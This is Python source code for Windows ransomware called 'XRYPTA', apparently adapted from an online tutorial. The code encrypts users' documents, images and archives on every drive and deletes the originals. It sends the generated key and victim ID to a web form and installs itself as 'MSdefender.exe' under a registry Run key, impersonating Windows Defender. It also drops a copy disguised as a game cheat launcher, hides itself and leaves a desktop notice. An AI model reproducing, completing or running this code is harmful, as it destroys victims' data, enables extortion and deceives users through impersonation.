'''from Crypto.Hash import SHA256
from Crypto.Cipher import AES
from hashlib import sha1
from _winreg import OpenKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, SetValueEx
from sys import argv
from urllib import urlencode
from urllib2 import Request, urlopen
from random import SystemRandom, randint
from string import ascii_uppercase, ascii_lowercase, digits
from winerror import ERROR_ALREADY_EXISTS
from win32event import CreateMutex
from win32api import GetLogicalDriveStrings, GetLastError, SetFileAttributes
from win32con import FILE_ATTRIBUTE_HIDDEN
from base64 import b64encode, b64decode
from webbrowser import open as wopen
from stat import S_IRUSR, S_IRGRP, S_IROTH
import os, pkg_resources

def gen_credential():
        UID = sha1()
        UID.update(os.getenv('COMPUTERNAME')+':'+''.join(SystemRandom().choice(ascii_uppercase + ascii_lowercase + digits) for _ in range(5)))
        UID = UID.hexdigest()
        KEY = ''.join(SystemRandom().choice(ascii_uppercase + ascii_lowercase + digits) for _ in range(128))
        return sub_credential(UID, KEY)

def sub_credential(sub_UID, sub_KEY):
        URL='YOUR GOOGLE FORM URL'
        SUBM = {'ENTRY MUNG': sub_UID, 'ENTRY 2 MUNG': sub_KEY}
        try:
                ENCAP_DATA = urlencode(SUBM)
                REQ = Request(URL, ENCAP_DATA)
                RES = urlopen(REQ)
        except Exception:
                return 0
        with open(os.getenv('localappdata')+'\\Windows Defender\\INFO', 'w') as UID_FILE:
                UID_FILE.write(b64encode(sub_UID))
                UID_FILE.close()
        return sub_KEY

def encrypt(key, filename):
        outFile = os.path.join(os.path.dirname(filename), os.path.basename(filename)+'_ENCRYPTED')
        chunksize = 64 * 1024
        with open(filename,'rb') as infile:
                filesize = str(os.path.getsize(filename)).zfill(16)
                IV = ''.join(SystemRandom().choice(chr(randint(0, 0xFF))) for _ in range(16))
                encryptor = AES.new(key, AES.MODE_CBC, IV)
                try:
                        with open(outFile,'wb') as outfile:
                                outfile.write(filesize)
                                outfile.write(IV)
                                while True:
                                        chunk = infile.read(chunksize)

                                        if len(chunk) == 0:
                                                break

                                        elif len(chunk) % 16 != 0:
                                                chunk += ' ' *  (16 - (len(chunk) % 16)) 
                                        outfile.write(encryptor.encrypt(chunk))
                                outfile.close()
                except IOError:
                        return 0
                return 1

def list_dir():
        encDirs = []
        rsv_dirs = ['C:\\Windows', 'C:\\Program Files', 'C:\\Program Files (x86)', 'C:\\Python27']
        for pre_encDrive in GetLogicalDriveStrings().split('\000')[:-1]:
                if pre_encDrive == os.path.split(os.environ['WINDIR'])[0]:
                        try:
                                for pre_encDir in os.listdir(pre_encDrive):
                                        chk_path = os.path.join(pre_encDrive, pre_encDir)
                                        if not os.path.isdir(chk_path) or any(rsv_dir in chk_path for rsv_dir in rsv_dirs):
                                                pass
                                        else:
                                                encDirs.append(chk_path)
                        except WindowsError:
                                pass
                elif os.access(pre_encDrive, os.F_OK): encDirs.append(pre_encDrive)
        return encDirs

def post_infected():
        with open(os.getenv('localappdata')+'\\Windows Defender\\INFO', 'r') as PI_UID_FILE:
                PI_UID = b64decode(PI_UID_FILE.readline())
                PI_UID_FILE.close()
        with open(os.path.join(os.path.expanduser("~\\Desktop"), 'XRYPTA_INFO.txt'), 'w') as NOTI_FILE:
                NOTI_FILE.write('XRYPTA_BY_AITREBIL')
                NOTI_FILE.close()
        os.chmod(os.path.join(os.path.expanduser("~\\Desktop"), 'XRYPTA_INFO.txt'), S_IRUSR)
        os.chmod(os.path.join(os.path.expanduser("~\\Desktop"), 'XRYPTA_INFO.txt'), S_IRGRP)
        os.chmod(os.path.join(os.path.expanduser("~\\Desktop"), 'XRYPTA_INFO.txt'), S_IROTH)

def main():
        password = gen_credential()
        cnt = 0
        password='test'
        drives = list_dir()
        tgt_exts = ['.raw','.png','.bmp','.gif','.jpg','.pdf','.doc','.docx','.ppt','.pptx','.xls','.xlsx','.txt','.xml','.csv','.c','.cpp','.java','.jar','.rar','.zip']
        for drive in drives:
                for root, subfiles, files in os.walk(drive):
                        for name in files:
                                encFile = os.path.join(root, name)
                                if (not os.path.exists(encFile)) or (not any(tgt_ext in name for tgt_ext in tgt_exts)) or name.endswith('_ENCRYPTED') or (name == (os.path.join(os.getcwd(), argv[0]).split('\\'))[-1:][0]):
                                        pass
                                elif encrypt(SHA256.new(password).digest(), encFile) == 1:
                                        try:
                                                os.remove(encFile)
                                        except OSError:
                                                pass
                                        cnt += 1
        print '\n'+str(cnt)
        return 0

if __name__ == '__main__':
        mutex = CreateMutex(None, 1, 'mutex_var_xboz')
        if GetLastError() == ERROR_ALREADY_EXISTS:
                exit(0)
        else:
                hPath = os.getenv('localappdata')+'\\Windows Defender'
                if os.path.exists(hPath) == False:
                        os.makedirs(hPath)
                        os.system('copy '+'\"'+argv[0]+'\" \"'+hPath+'\\MSdefender.exe"')
                        keyVal = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
                        key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
                        SetValueEx(key2change, 'Windows Defender',0,REG_SZ, '\"'+hPath+'\\MSdefender.exe\"')
                        os.system('copy '+'\"'+argv[0]+'\" \"'+os.path.join(os.getcwd(), 'Cheat_Iauncher.exe')+'\"')
                        SetFileAttributes(argv[0], FILE_ATTRIBUTE_HIDDEN)
                        main()
                        post_infected()
                elif os.path.exists(os.getenv('localappdata')+'\\Windows Defender\\INFO'):
                        if os.path.exists(os.path.join(os.path.expanduser("~\\Desktop"), 'XRYPTA_INFO.txt')):
                                pass
                        else:
                                post_infected()''''
#XRYPTA by SchynWong
#Ref: http://null-byte.wonderhowto.com/how-to/create-encryption-program-with-python-0164249
